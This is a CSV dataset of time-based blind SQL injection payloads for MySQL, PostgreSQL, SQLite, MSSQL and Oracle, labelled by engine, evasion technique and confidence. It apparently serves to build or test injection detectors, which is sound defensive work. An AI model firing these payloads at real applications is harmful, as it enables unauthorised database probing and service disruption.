payload,sqli_type,db_engine,evasion_tech,confidence,classification_method,source,context
"1"" ) as amak where 7938 = 7938 and elt ( 1210 = 1210,sleep ( 5 ) ) --",time_blind,mysql,,0.4,rule,sqliv2_csv,unknown
"1' ) ) as crzr where 5373 = 5373 and elt ( 3114 = 3114,sleep ( 5 ) ) #",time_blind,mysql,,0.4,rule,sqliv2_csv,unknown
"1"" ) as mohv where 2171 = 2171 or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #",time_blind,mysql,case_variation,0.4,rule,sqliv2_csv,unknown
"1' ) ) ) or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( ( 'iari' = 'iari",time_blind,sqlite,,0.53,rule,sqliv2_csv,unknown
1' ) ) and sleep ( 5 ) and ( ( 'krrr' = 'krrr,time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
1'+ ( select brgo where 9100 = 9100 or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --,time_blind,postgresql,case_variation,0.41,rule,sqliv2_csv,unknown
"1"" and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and ""tqbi"" = ""tqbi",time_blind,mysql,hex_string,0.45,rule,sqliv2_csv,unknown
"1' ) as ohcs where 9588 = 9588 or elt ( 6272 = 6272,sleep ( 5 ) ) --",time_blind,mysql,,0.4,rule,sqliv2_csv,unknown
1' ) ) or sleep ( 5 ) and ( ( 'zxik' = 'zxik,time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
"1'+ ( select 'qmtx' where 6992 = 6992 and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,case_variation,0.47,rule,sqliv2_csv,unknown
"1"" ) ) ) or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( ( ""wvyb"" = ""wvyb",time_blind,sqlite,,0.53,rule,sqliv2_csv,unknown
1 ) ) as qgma where 7675 = 7675 rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #,time_blind,mysql,case_variation,0.4,rule,sqliv2_csv,unknown
"1' ) ) as hbdi where 6758 = 6758 and elt ( 1210 = 1210,sleep ( 5 ) ) --",time_blind,mysql,,0.4,rule,sqliv2_csv,unknown
"1"" ) ) and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and ( ( ""nepk"" = ""nepk",time_blind,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1' or elt ( 6272 = 6272,sleep ( 5 ) ) and 'vrim' = 'vrim",time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
"1'+ ( select 'nzgq' where 7230 = 7230 and elt ( 1210 = 1210,sleep ( 5 ) ) ) +'",time_blind,mysql,case_variation,0.4,rule,sqliv2_csv,unknown
"( select * from ( select ( sleep ( 5 ) ) ) srmq ) and ( ""%"" = """,time_blind,mysql,case_variation,0.45,rule,sqliv2_csv,unknown
1 ) where 3979 = 3979 rlike sleep ( 5 ) --,time_blind,mysql,,0.4,rule,sqliv2_csv,unknown
1 ) ) as pynj where 7683 = 7683 waitfor delay '0:0:5'--,time_blind,mssql,,0.41,rule,sqliv2_csv,string_single_quote
select sleep ( 5 ) and ( 4863 = 4863,time_blind,mysql,case_variation,0.45,rule,sqliv2_csv,unknown
1 ) ) as lkqx where 6468 = 6468 or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #,time_blind,mysql,case_variation,0.4,rule,sqliv2_csv,unknown
"1"" ) or 6793 = ( select 6793 from pg_sleep ( 5 ) ) and ( ""lsis"" like ""lsis",time_blind,postgresql,case_variation|function_alternative,0.46,rule,sqliv2_csv,unknown
"( select ( case when ( 1938 = 1938 ) then dbms_pipe.receive_message ( chr ( 118 ) ||chr ( 118 ) ||chr ( 112 ) ||chr ( 76 ) ,5 ) else 1938 end ) from dual )",time_blind,oracle,case_variation,0.51,rule,sqliv2_csv,unknown
1' ) ) and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) and ( ( 'tjvy' like 'tjvy,time_blind,mysql,case_variation|function_alternative,0.45,rule,sqliv2_csv,unknown
"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ""%"" = """,time_blind,sqlite,case_variation,0.53,rule,sqliv2_csv,unknown
"1 ) as drbw where 2380 = 2380 or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) --",time_blind,mysql,hex_string,0.4,rule,sqliv2_csv,unknown
1' ) where 3636 = 3636 or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --,time_blind,postgresql,case_variation,0.41,rule,sqliv2_csv,unknown
"1"" ) and elt ( 3114 = 3114,sleep ( 5 ) ) #",time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
1%' ) waitfor delay '0:0:5'--,time_blind,mssql,,0.46,rule,sqliv2_csv,string_single_quote
"( select ( case when ( 4232 = 4232 ) then ( select benchmark ( 5000000,md5 ( 0x6b637544 ) ) ) else 4232* ( select 4232 from mysql.db ) end ) )",time_blind,mysql,case_variation|hex_string,0.45,rule,sqliv2_csv,unknown
1' ) ) ) rlike sleep ( 5 ) and ( ( ( 'zwyx' = 'zwyx,time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
"1"" ) as zjwu where 9963 = 9963 or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",time_blind,mysql,hex_string,0.4,rule,sqliv2_csv,unknown
1' ) ) rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) and ( ( 'krvo' like 'krvo,time_blind,mysql,case_variation|function_alternative,0.45,rule,sqliv2_csv,unknown
1' ) ) ) waitfor delay '0:0:5' and ( ( ( 'clcf' = 'clcf,time_blind,mssql,,0.46,rule,sqliv2_csv,unknown
1' ) ) ) and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #,time_blind,mysql,case_variation,0.45,rule,sqliv2_csv,unknown
"1' ) ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ( ( 'ltym' = 'ltym",time_blind,mysql,hex_string,0.45,rule,sqliv2_csv,unknown
"1"" ) and elt ( 1210 = 1210,sleep ( 5 ) ) and ( ""zxks"" = ""zxks",time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
"1"" ) ) ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ( ( ( ""rtzn"" = ""rtzn",time_blind,oracle,,0.46,rule,sqliv2_csv,unknown
1'|| ( select 'ovlx' where 8767 = 8767 or sleep ( 5 ) ) ||',time_blind,mysql,case_variation,0.4,rule,sqliv2_csv,unknown
"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ""unju"" = ""unju",time_blind,sqlite,case_variation,0.53,rule,sqliv2_csv,unknown
1 ) ) ) and sleep ( 5 ) #,time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
1 ) as fxfe where 1148 = 1148 or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #,time_blind,mysql,case_variation,0.4,rule,sqliv2_csv,unknown
"1"" ) ) as yutu where 1306 = 1306 and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) --",time_blind,oracle,,0.41,rule,sqliv2_csv,unknown
"1%"" and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and ""%"" = """,time_blind,mysql,hex_string,0.45,rule,sqliv2_csv,unknown
"1"" or elt ( 6272 = 6272,sleep ( 5 ) ) and ""zzca"" = ""zzca",time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
1' ) ) as vnwn where 8774 = 8774 and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #,time_blind,mysql,case_variation,0.4,rule,sqliv2_csv,unknown
"1' where 8360 = 8360 or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",time_blind,oracle,,0.41,rule,sqliv2_csv,unknown
"1%"" ) ) rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) and ( ( ""%"" = """,time_blind,mysql,case_variation,0.45,rule,sqliv2_csv,unknown
"1"" ) ) ) rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #",time_blind,mysql,case_variation,0.45,rule,sqliv2_csv,unknown
select sleep ( 5 ) and ( ( ( 'iwwa' like 'iwwa,time_blind,mysql,case_variation|function_alternative,0.45,rule,sqliv2_csv,unknown
1'|| ( select 'tcfy' where 4546 = 4546 and 6969 = ( select 6969 from pg_sleep ( 5 ) ) ) ||',time_blind,postgresql,case_variation,0.41,rule,sqliv2_csv,unknown
1 ) ) and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #,time_blind,mysql,case_variation,0.45,rule,sqliv2_csv,unknown
"1"" ) ) ) and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and ( ( ( ""pnsz"" like ""pnsz",time_blind,mysql,function_alternative|hex_string,0.45,rule,sqliv2_csv,unknown
"1"" ) where 4971 = 4971 and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) --",time_blind,mysql,hex_string,0.4,rule,sqliv2_csv,unknown
"1 where 7158 = 7158 or elt ( 5873 = 5873,sleep ( 5 ) ) #",time_blind,mysql,,0.4,rule,sqliv2_csv,unknown
"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ""yxes"" like ""yxes",time_blind,sqlite,case_variation|function_alternative,0.53,rule,sqliv2_csv,unknown
"1"" ) ) as ycvh where 4523 = 4523 and sleep ( 5 ) #",time_blind,mysql,,0.4,rule,sqliv2_csv,unknown
1' ) ) or 6793 = ( select 6793 from pg_sleep ( 5 ) ) and ( ( 'zjun' = 'zjun,time_blind,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
1 ) ) or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #,time_blind,mysql,case_variation,0.45,rule,sqliv2_csv,unknown
"1 ) ) ) or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,,0.53,rule,sqliv2_csv,unknown
"1"" ) ) as wugz where 5355 = 5355 and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) --",time_blind,mysql,hex_string,0.4,rule,sqliv2_csv,unknown
1%' ) rlike sleep ( 5 ) and ( '%' = ',time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
"1' ) and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( 'cssb' = 'cssb",time_blind,sqlite,,0.53,rule,sqliv2_csv,unknown
1' in boolean mode ) or 6793 = ( select 6793 from pg_sleep ( 5 ) ) #,time_blind,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
1 or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ),time_blind,mysql,case_variation,0.45,rule,sqliv2_csv,unknown
1' ) where 2928 = 2928 and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #,time_blind,mysql,case_variation,0.4,rule,sqliv2_csv,unknown
"1 ) as cnpv where 4902 = 4902 and elt ( 1210 = 1210,sleep ( 5 ) ) --",time_blind,mysql,,0.4,rule,sqliv2_csv,unknown
"1 ) ) and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,,0.53,rule,sqliv2_csv,unknown
"1' ) ) or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",time_blind,oracle,,0.46,rule,sqliv2_csv,unknown
"1%"" ) ) ) and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and ( ( ( ""%"" = """,time_blind,oracle,,0.46,rule,sqliv2_csv,unknown
"1%"" or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --",time_blind,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1"" ) and sleep ( 5 ) #",time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
"1'+ ( select 'wkcq' where 1020 = 1020 and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",time_blind,mysql,case_variation|hex_string,0.4,rule,sqliv2_csv,unknown
1 ) rlike sleep ( 5 ),time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
1%' ) ) and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #,time_blind,mysql,case_variation,0.45,rule,sqliv2_csv,unknown
"1"" ) rlike sleep ( 5 ) and ( ""rfsd"" = ""rfsd",time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
1%' ) rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) and ( '%' = ',time_blind,mysql,case_variation,0.45,rule,sqliv2_csv,unknown
"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) and ( ( ""uhvy"" = ""uhvy",time_blind,mysql,case_variation|hex_string,0.45,rule,sqliv2_csv,unknown
"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) -- ygbf",time_blind,sqlite,case_variation,0.53,rule,sqliv2_csv,unknown
"1' where 7190 = 7190 and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,,0.47,rule,sqliv2_csv,unknown
select sleep ( 5 ) and ( ( ( 'klma' = 'klma,time_blind,mysql,case_variation,0.45,rule,sqliv2_csv,unknown
"1'|| ( select 'scqw' where 3337 = 3337 or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",time_blind,oracle,case_variation,0.41,rule,sqliv2_csv,unknown
"1 where 5099 = 5099 and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",time_blind,oracle,,0.41,rule,sqliv2_csv,unknown
"1"" ) where 6679 = 6679 rlike sleep ( 5 ) #",time_blind,mysql,,0.4,rule,sqliv2_csv,unknown
( select * from ( select ( sleep ( 5 ) ) ) srmq ),time_blind,mysql,case_variation,0.45,rule,sqliv2_csv,unknown
select pg_sleep ( 5 ) and ( 'itgc' = 'itgc,time_blind,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1' ) where 9381 = 9381 or elt ( 6272 = 6272,sleep ( 5 ) ) --",time_blind,mysql,,0.4,rule,sqliv2_csv,unknown
"1%"" ) ) or sleep ( 5 ) and ( ( ""%"" = """,time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
"1' ) ) and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and ( ( 'jylk' = 'jylk",time_blind,oracle,,0.46,rule,sqliv2_csv,unknown
"1%"" or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ""%"" = """,time_blind,mysql,hex_string,0.45,rule,sqliv2_csv,unknown
1' where 7725 = 7725 or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #,time_blind,mysql,case_variation,0.4,rule,sqliv2_csv,unknown
1'|| ( select 'npdx' from dual where 9486 = 9486 and sleep ( 5 ) ) ||',time_blind,mysql,case_variation,0.4,rule,sqliv2_csv,unknown
1 ) as bidc where 5268 = 5268 and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) --,time_blind,mysql,case_variation,0.4,rule,sqliv2_csv,unknown
1' ) ) as nsfx where 9553 = 9553 rlike sleep ( 5 ) --,time_blind,mysql,,0.4,rule,sqliv2_csv,unknown
"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual and ( ( ""vfvh"" = ""vfvh",time_blind,oracle,case_variation,0.51,rule,sqliv2_csv,unknown
"1' and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and 'rupq' = 'rupq",time_blind,oracle,,0.46,rule,sqliv2_csv,unknown
1' ) ) ) or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and ( ( ( 'brhc' like 'brhc,time_blind,mysql,case_variation|function_alternative,0.45,rule,sqliv2_csv,unknown
"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( ( ""%"" = """,time_blind,sqlite,case_variation,0.53,rule,sqliv2_csv,unknown
1%' ) and sleep ( 5 ) and ( '%' = ',time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
"waitfor delay '0:0:5' and ( ( ( ""%"" = """,time_blind,mssql,,0.46,rule,sqliv2_csv,unknown
"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual",time_blind,oracle,case_variation,0.51,rule,sqliv2_csv,unknown
"1'|| ( select 'alxi' where 3967 = 3967 and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",time_blind,mysql,case_variation|hex_string,0.4,rule,sqliv2_csv,unknown
"1 or elt ( 6272 = 6272,sleep ( 5 ) ) # klaw",time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
"1%"" or elt ( 6272 = 6272,sleep ( 5 ) ) and ""%"" = """,time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
"1%"" ) ) or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --",time_blind,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1"" ) where 6809 = 6809 rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) --",time_blind,mysql,case_variation,0.4,rule,sqliv2_csv,unknown
"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual and ""psbz"" = ""psbz",time_blind,oracle,case_variation,0.51,rule,sqliv2_csv,unknown
"1%"" and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and ""%"" = """,time_blind,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1%' ) or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( '%' = '",time_blind,sqlite,,0.53,rule,sqliv2_csv,unknown
"1 where 7642 = 7642 or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) --",time_blind,oracle,,0.41,rule,sqliv2_csv,unknown
"1%"" ) ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ( ( ""%"" = """,time_blind,oracle,,0.46,rule,sqliv2_csv,unknown
"1%"" ) ) and sleep ( 5 ) and ( ( ""%"" = """,time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
1' ) as svtm where 7627 = 7627 rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) --,time_blind,mysql,case_variation,0.4,rule,sqliv2_csv,unknown
"1' ) ) and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,,0.53,rule,sqliv2_csv,unknown
1' and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #,time_blind,mysql,case_variation,0.45,rule,sqliv2_csv,unknown
"1%"" ) ) and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) and ( ( ""%"" = """,time_blind,mysql,case_variation,0.45,rule,sqliv2_csv,unknown
"1' and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and 'imqi' = 'imqi",time_blind,sqlite,,0.53,rule,sqliv2_csv,unknown
"1"" and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ""fqeu"" like ""fqeu",time_blind,sqlite,function_alternative,0.53,rule,sqliv2_csv,unknown
"1' ) where 4778 = 4778 and elt ( 3114 = 3114,sleep ( 5 ) ) #",time_blind,mysql,,0.4,rule,sqliv2_csv,unknown
"1"" ) rlike sleep ( 5 ) #",time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
"1'+ ( select dagm where 5461 = 5461 or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) ) +'",time_blind,mysql,case_variation|hex_string,0.4,rule,sqliv2_csv,unknown
"1%"" rlike sleep ( 5 ) #",time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
1 waitfor delay '0:0:5',time_blind,mssql,,0.46,rule,sqliv2_csv,unknown
"1%"" ) ) and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and ( ( ""%"" = """,time_blind,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
1' ) ) waitfor delay '0:0:5' and ( ( 'bbqk' = 'bbqk,time_blind,mssql,,0.46,rule,sqliv2_csv,unknown
1' waitfor delay '0:0:5',time_blind,mssql,,0.46,rule,sqliv2_csv,unknown
"1'+ ( select 'ngdk' where 7264 = 7264 and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) ) +'",time_blind,sqlite,case_variation,0.47,rule,sqliv2_csv,unknown
1' waitfor delay '0:0:5' and 'vwuz' = 'vwuz,time_blind,mssql,,0.46,rule,sqliv2_csv,unknown
"1' in boolean mode ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) #",time_blind,oracle,,0.46,rule,sqliv2_csv,unknown
"1' ) ) ) and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and ( ( ( 'subq' like 'subq",time_blind,mysql,function_alternative|hex_string,0.45,rule,sqliv2_csv,unknown
1 ) ) and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and ( ( 9288 = 9288,time_blind,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
waitfor delay '0:0:5' and 'gsvt' = 'gsvt,time_blind,mssql,,0.46,rule,sqliv2_csv,unknown
1' where 6035 = 6035 waitfor delay '0:0:5'--,time_blind,mssql,,0.41,rule,sqliv2_csv,string_single_quote
"1%"" ) ) ) rlike sleep ( 5 ) #",time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
"1"" ) and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",time_blind,oracle,,0.46,rule,sqliv2_csv,unknown
"1%' ) ) and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,,0.53,rule,sqliv2_csv,unknown
"( select * from ( select ( sleep ( 5 ) ) ) srmq ) and ( ( ""hxdd"" = ""hxdd",time_blind,mysql,case_variation,0.45,rule,sqliv2_csv,unknown
1%' ) ) waitfor delay '0:0:5' and ( ( '%' = ',time_blind,mssql,,0.46,rule,sqliv2_csv,unknown
"1"" ) as dezr where 2145 = 2145 or sleep ( 5 ) #",time_blind,mysql,,0.4,rule,sqliv2_csv,unknown
"1%"" ) or elt ( 6272 = 6272,sleep ( 5 ) ) and ( ""%"" = """,time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
"1%"" waitfor delay '0:0:5'--",time_blind,mssql,,0.46,rule,sqliv2_csv,string_single_quote
1' ) rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #,time_blind,mysql,case_variation,0.45,rule,sqliv2_csv,unknown
"1'|| ( select 'eamo' where 4958 = 4958 and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) ) ||'",time_blind,oracle,case_variation,0.41,rule,sqliv2_csv,unknown
waitfor delay '0:0:5' ) +',time_blind,mssql,,0.46,rule,sqliv2_csv,unknown
1' or sleep ( 5 ) and 'udqz' = 'udqz,time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
1' ) ) and sleep ( 5 ) #,time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
1%' ) ) rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #,time_blind,mysql,case_variation,0.45,rule,sqliv2_csv,unknown
"1' ) ) ) or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( ( 'ckfn' like 'ckfn",time_blind,sqlite,function_alternative,0.53,rule,sqliv2_csv,unknown
1' and ( select * from ( select ( sleep ( 5 ) ) ) fzno ),time_blind,mysql,case_variation,0.45,rule,sqliv2_csv,unknown
"1 ) ) ) and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",time_blind,oracle,,0.46,rule,sqliv2_csv,unknown
select pg_sleep ( 5 ) and ( ( 'rnzp' = 'rnzp,time_blind,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
1' ) where 6222 = 6222 or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) --,time_blind,mysql,case_variation,0.4,rule,sqliv2_csv,unknown
"1"" ) where 7957 = 7957 and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,,0.47,rule,sqliv2_csv,unknown
1' ) where 8142 = 8142 waitfor delay '0:0:5'--,time_blind,mssql,,0.41,rule,sqliv2_csv,string_single_quote
"1'|| ( select 'wcad' from dual where 4262 = 4262 and elt ( 3114 = 3114,sleep ( 5 ) ) #",time_blind,mysql,case_variation,0.4,rule,sqliv2_csv,unknown
"1', ( select ( case when ( 7734 = 7734 ) then ( select benchmark ( 5000000,md5 ( 0x72747341 ) ) ) else 7734* ( select 7734 from mysql.db ) end ) )",time_blind,mysql,case_variation|hex_string,0.45,rule,sqliv2_csv,unknown
"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( ( ""jwzy"" = ""jwzy",time_blind,sqlite,case_variation,0.53,rule,sqliv2_csv,unknown
"1"" rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) and ""wcze"" = ""wcze",time_blind,mysql,case_variation,0.45,rule,sqliv2_csv,unknown
"1"" ) rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #",time_blind,mysql,case_variation,0.45,rule,sqliv2_csv,unknown
1' ) waitfor delay '0:0:5'--,time_blind,mssql,,0.46,rule,sqliv2_csv,string_single_quote
"1' in boolean mode ) and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",time_blind,mysql,hex_string,0.45,rule,sqliv2_csv,unknown
"1 or elt ( 6272 = 6272,sleep ( 5 ) )",time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
"1%"" ) ) ) and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",time_blind,mysql,hex_string,0.45,rule,sqliv2_csv,unknown
"1' ) ) as fusi where 2788 = 2788 or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",time_blind,mysql,hex_string,0.4,rule,sqliv2_csv,unknown
"1 ) where 8691 = 8691 or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,,0.47,rule,sqliv2_csv,unknown
"1 and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) -- kvkk",time_blind,mysql,hex_string,0.45,rule,sqliv2_csv,unknown
1' ) ) rlike sleep ( 5 ) #,time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
"1 ) as agex where 8167 = 8167 and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) --",time_blind,mysql,hex_string,0.4,rule,sqliv2_csv,unknown
1%' ) ) waitfor delay '0:0:5'--,time_blind,mssql,,0.46,rule,sqliv2_csv,string_single_quote
